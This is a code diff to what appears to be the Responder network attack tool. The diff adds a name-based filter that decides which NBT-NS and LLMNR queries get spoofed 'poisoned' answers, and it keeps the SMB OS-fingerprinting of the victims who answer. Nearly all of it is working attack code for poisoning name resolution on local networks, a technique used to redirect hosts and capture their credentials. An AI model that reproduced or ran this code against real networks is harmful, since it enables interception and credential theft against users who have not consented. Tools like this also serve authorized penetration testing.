@@ -81,6 +81,8 @@ FILENAME = config.get('HTTP Server', 'Filename')
 WPAD_Script = config.get('HTTP Server', 'WPADScript')
 RespondTo = config.get('Responder Core', 'RespondTo').strip()
 RespondTo.split(",")
+RespondToName = config.get('Responder Core', 'RespondToName').strip()
+RespondToName.split(",")
 #Cli options.
 OURIP = options.OURIP
 LM_On_Off = options.LM_On_Off.upper()
@@ -234,11 +236,24 @@ def RespondToSpecificHost(RespondTo):
     else:
        return False
 
+def RespondToSpecificName(RespondToName):
+    if len(RespondToName)>=1 and RespondToName != ['']:
+       return True
+    else:
+       return False
+
 def RespondToIPScope(RespondTo, ClientIp):
     if ClientIp in RespondTo:
        return True
     else:
        return False
+
+def RespondToNameScope(RespondToName, Name):
+    if Name in RespondToName:
+       return True
+    else:
+       return False
+
 
 ##################################################################################
 #NBT NS Stuff
@@ -339,55 +354,101 @@ class NB(BaseRequestHandler):
                  if PrintLLMNRNBTNS(AnalyzeFilename,Message):
                     print Message
                  logger3.warning(Message)
-           
+
         if RespondToSpecificHost(RespondTo) and Analyze(AnalyzeMode) == False:
            if RespondToIPScope(RespondTo, self.client_address[0]):
               if data[2:4] == "\x01\x10":
                  if Validate_NBT_NS(data,Wredirect):
-                    buff = NBT_Ans()
-                    buff.calculate(data)
-                    for x in range(1):
-                       socket.sendto(str(buff), self.client_address)
-                       Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
-                       logging.warning(Message)
-                       if PrintLLMNRNBTNS(Log2Filename,Message):
-                          print Message
-                          logger2.warning(Message)
-                       if Is_Finger_On(Finger_On_Off):
-                          try:
-                             Finger = RunSmbFinger((self.client_address[0],445))
-                             print '[+] OsVersion is:%s'%(Finger[0])
-                             print '[+] ClientVersion is :%s'%(Finger[1])
-                             logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                             logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
-                          except Exception:
-                             logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
-                             pass
+                    if RespondToSpecificName(RespondToName) == False:
+                       buff = NBT_Ans()
+                       buff.calculate(data)
+                       for x in range(1):
+                          socket.sendto(str(buff), self.client_address)
+                          Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
+                          logging.warning(Message)
+                          if PrintLLMNRNBTNS(Log2Filename,Message):
+                             print Message
+                             logger2.warning(Message)
+                          if Is_Finger_On(Finger_On_Off):
+                             try:
+                                Finger = RunSmbFinger((self.client_address[0],445))
+                                print '[+] OsVersion is:%s'%(Finger[0])
+                                print '[+] ClientVersion is :%s'%(Finger[1])
+                                logging.warning('[+] OsVersion is:%s'%(Finger[0]))
+                                logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                             except Exception:
+                                logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                pass
+                    if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
+                       buff = NBT_Ans()
+                       buff.calculate(data)
+                       for x in range(1):
+                          socket.sendto(str(buff), self.client_address)
+                          Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
+                          logging.warning(Message)
+                          if PrintLLMNRNBTNS(Log2Filename,Message):
+                             print Message
+                             logger2.warning(Message)
+                          if Is_Finger_On(Finger_On_Off):
+                             try:
+                                Finger = RunSmbFinger((self.client_address[0],445))
+                                print '[+] OsVersion is:%s'%(Finger[0])
+                                print '[+] ClientVersion is :%s'%(Finger[1])
+                                logging.warning('[+] OsVersion is:%s'%(Finger[0]))
+                                logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                             except Exception:
+                                logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                pass
+                    else:
+                       pass
            else:
               pass
 
         else:
            if data[2:4] == "\x01\x10":
               if Validate_NBT_NS(data,Wredirect) and Analyze(AnalyzeMode) == False:
-                 buff = NBT_Ans()
-                 buff.calculate(data)
-                 for x in range(1):
-                    socket.sendto(str(buff), self.client_address)
-                 Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
-                 logging.warning(Message)
-                 if PrintLLMNRNBTNS(Log2Filename,Message):
-                    print Message
-                    logger2.warning(Message)
-                 if Is_Finger_On(Finger_On_Off):
-                    try:
-                       Finger = RunSmbFinger((self.client_address[0],445))
-                       print '[+] OsVersion is:%s'%(Finger[0])
-                       print '[+] ClientVersion is :%s'%(Finger[1])
-                       logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                       logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
-                    except Exception:
-                       logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
-                       pass
+                 if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
+                    buff = NBT_Ans()
+                    buff.calculate(data)
+                    for x in range(1):
+                       socket.sendto(str(buff), self.client_address)
+                    Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
+                    logging.warning(Message)
+                    if PrintLLMNRNBTNS(Log2Filename,Message):
+                       print Message
+                       logger2.warning(Message)
+                    if Is_Finger_On(Finger_On_Off):
+                       try:
+                          Finger = RunSmbFinger((self.client_address[0],445))
+                          print '[+] OsVersion is:%s'%(Finger[0])
+                          print '[+] ClientVersion is :%s'%(Finger[1])
+                          logging.warning('[+] OsVersion is:%s'%(Finger[0]))
+                          logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                       except Exception:
+                          logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                          pass
+                 if RespondToSpecificName(RespondToName) == False:
+                    buff = NBT_Ans()
+                    buff.calculate(data)
+                    for x in range(1):
+                       socket.sendto(str(buff), self.client_address)
+                    Message = 'NBT-NS Answer sent to: %s. The requested name was : %s'%(self.client_address[0], Name)
+                    logging.warning(Message)
+                    if PrintLLMNRNBTNS(Log2Filename,Message):
+                       print Message
+                       logger2.warning(Message)
+                    if Is_Finger_On(Finger_On_Off):
+                       try:
+                          Finger = RunSmbFinger((self.client_address[0],445))
+                          print '[+] OsVersion is:%s'%(Finger[0])
+                          print '[+] ClientVersion is :%s'%(Finger[1])
+                          logging.warning('[+] OsVersion is:%s'%(Finger[0]))
+                          logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                       except Exception:
+                          logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                          pass
+                 else:
+                    pass
 
 ##################################################################################
 #Browser Listener and Lanman Finger
@@ -1224,12 +1285,60 @@ class LLMNR(BaseRequestHandler):
                      if data[2:4] == "\x00\x00":
                         if Parse_IPV6_Addr(data):
                            Name = Parse_LLMNR_Name(data)
+                           if RespondToSpecificName(RespondToName) == False:
+                              buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
+                              buff.calculate()
+                              for x in range(1):
+                                 soc.sendto(str(buff), self.client_address)
+                              Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
+                              logging.warning(Message)
+                              if PrintLLMNRNBTNS(Log2Filename,Message):
+                                 print Message
+                                 logger2.warning(Message)
+                              if Is_Finger_On(Finger_On_Off):
+                                 try:
+                                    Finger = RunSmbFinger((self.client_address[0],445))
+                                    print '[+] OsVersion is:%s'%(Finger[0])
+                                    print '[+] ClientVersion is :%s'%(Finger[1])
+                                    logging.warning('[+] OsVersion is:%s'%(Finger[0]))
+                                    logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                                 except Exception:
+                                    logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                    pass
+
+                           if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
+                              buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
+                              buff.calculate()
+                              for x in range(1):
+                                 soc.sendto(str(buff), self.client_address)
+                              Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
+                              logging.warning(Message)
+                              if PrintLLMNRNBTNS(Log2Filename,Message):
+                                 print Message
+                                 logger2.warning(Message)
+                              if Is_Finger_On(Finger_On_Off):
+                                 try:
+                                    Finger = RunSmbFinger((self.client_address[0],445))
+                                    print '[+] OsVersion is:%s'%(Finger[0])
+                                    print '[+] ClientVersion is :%s'%(Finger[1])
+                                    logging.warning('[+] OsVersion is:%s'%(Finger[0]))
+                                    logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                                 except Exception:
+                                    logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                    pass
+                     else:
+                        pass
+
+            if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
+               if data[2:4] == "\x00\x00":
+                     if Parse_IPV6_Addr(data):
+                        Name = Parse_LLMNR_Name(data)
+                        if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
                            buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
                            buff.calculate()
+                           Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
                            for x in range(1):
                               soc.sendto(str(buff), self.client_address)
-                           Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
-                           logging.warning(Message)
                            if PrintLLMNRNBTNS(Log2Filename,Message):
                               print Message
                               logger2.warning(Message)
@@ -1243,33 +1352,31 @@ class LLMNR(BaseRequestHandler):
                               except Exception:
                                  logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
                                  pass
-
-            if Analyze(AnalyzeMode) == False and RespondToSpecificHost(RespondTo) == False:
-               if data[2:4] == "\x00\x00":
-                     if Parse_IPV6_Addr(data):
-                        Name = Parse_LLMNR_Name(data)
-                        buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
-                        buff.calculate()
-                        Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
-                        for x in range(1):
-                           soc.sendto(str(buff), self.client_address)
-                        if PrintLLMNRNBTNS(Log2Filename,Message):
-                           print Message
-                           logger2.warning(Message)
-                        if Is_Finger_On(Finger_On_Off):
-                           try:
-                              Finger = RunSmbFinger((self.client_address[0],445))
-                              print '[+] OsVersion is:%s'%(Finger[0])
-                              print '[+] ClientVersion is :%s'%(Finger[1])
-                              logging.warning('[+] OsVersion is:%s'%(Finger[0]))
-                              logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
-                           except Exception:
-                              logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
-                              pass
+                        if RespondToSpecificName(RespondToName) == False:
+                           buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
+                           buff.calculate()
+                           Message =  "LLMNR poisoned answer sent to this IP: %s. The requested name was : %s."%(self.client_address[0],Name)
+                           for x in range(1):
+                              soc.sendto(str(buff), self.client_address)
+                           if PrintLLMNRNBTNS(Log2Filename,Message):
+                              print Message
+                              logger2.warning(Message)
+                           if Is_Finger_On(Finger_On_Off):
+                              try:
+                                 Finger = RunSmbFinger((self.client_address[0],445))
+                                 print '[+] OsVersion is:%s'%(Finger[0])
+                                 print '[+] ClientVersion is :%s'%(Finger[1])
+                                 logging.warning('[+] OsVersion is:%s'%(Finger[0]))
+                                 logging.warning('[+] ClientVersion is :%s'%(Finger[1]))
+                              except Exception:
+                                 logging.warning('[+] Fingerprint failed for host: %s'%(self.client_address[0]))
+                                 pass
+                        else:
+                           pass
             else:
                pass
         except:
-           pass
+           raise
 
 ##################################################################################
 #DNS Stuff
